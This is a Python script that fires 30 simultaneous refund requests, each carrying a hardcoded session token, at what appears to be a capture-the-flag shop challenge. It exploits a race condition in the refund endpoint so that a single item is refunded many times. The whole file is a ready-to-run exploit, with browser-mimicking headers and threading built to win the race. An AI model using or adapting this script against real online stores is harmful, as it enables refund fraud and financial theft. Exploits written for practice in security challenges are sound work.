import requests
import threading

# Target URL
url = "https://fessemisk-b79e-shop-4.ept.gg/"

# Headers for the request, based on the example provided
headers = {
    "Host": "fessemisk-b79e-shop-4.ept.gg",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not?A_Brand";v="99", "Chromium";v="130"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://fessemisk-b79e-shop-4.ept.gg",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://fessemisk-b79e-shop-4.ept.gg/orders",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

# Replace this with the actual session token
cookies = {
    "session_token": "1b30fd64be37a31cab49facc5cc6f4fa1e1b58cb5cbaddaa33160585cc68bf1e"
}

# Payload data for the refund action
payload = {
    "item_id": "1",  # Replace with the actual item ID if different
    "action": "refund"
}

def send_refund_request():
    """Function to send a single refund request."""
    response = requests.post(url, headers=headers, cookies=cookies, data=payload)
    print(f"Status Code: {response.status_code}, Response: {response.text}")

# List to hold threads
threads = []

# Number of threads to simulate the race condition
num_threads = 30  # Adjust this number as needed to increase the load

# Create threads to send requests concurrently
for _ in range(num_threads):
    t = threading.Thread(target=send_refund_request)
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()

print("Race condition test completed.")